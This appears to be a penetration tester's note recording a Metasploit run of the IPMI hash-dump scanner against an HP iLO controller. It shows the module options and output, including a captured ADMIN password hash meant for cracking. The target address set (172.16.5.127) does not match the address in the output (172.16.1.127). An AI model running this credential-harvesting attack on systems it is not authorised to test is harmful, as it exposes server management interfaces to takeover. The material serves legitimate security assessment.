Hash retrieved from one iLO box. Need to check if it can be cracked.

```[msf](Jobs:0 Agents:0) use auxiliary/scanner/ipmi/ipmi_dumphashes
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set rhosts 172.16.5.127
rhosts => 172.16.5.127
```

```[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting          Required  Description
   ----                  ---------------          --------  -----------
   CRACK_COMMON          true                     yes       Automatically crack common passwords a
                                                            s they are obtained
   OUTPUT_HASHCAT_FILE                            no        Save captured password hashes in hashc
                                                            at format
   OUTPUT_JOHN_FILE                               no        Save captured password hashes in john
                                                            the ripper format
   PASS_FILE             /usr/share/metasploit-f  yes       File containing common passwords for o
                         ramework/data/wordlists            ffline cracking, one per line
                         /ipmi_passwords.txt
   RHOSTS                172.16.5.127             yes       The target host(s), see https://github
                                                            .com/rapid7/metasploit-framework/wiki/
                                                            Using-Metasploit
   RPORT                 623                      yes       The target port
   SESSION_MAX_ATTEMPTS  5                        yes       Maximum number of session retries, req
                                                            uired on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                        yes       Delay between session retries in secon
                                                            ds
   THREADS               1                        yes       The number of concurrent threads (max
                                                            one per host)
   USER_FILE             /usr/share/metasploit-f  yes       File containing usernames, one per lin
                         ramework/data/wordlists            e
                         /ipmi_users.txt
```

```[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run

[+] 172.16.1.127:623 - IPMI - Hash found: ADMIN:5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed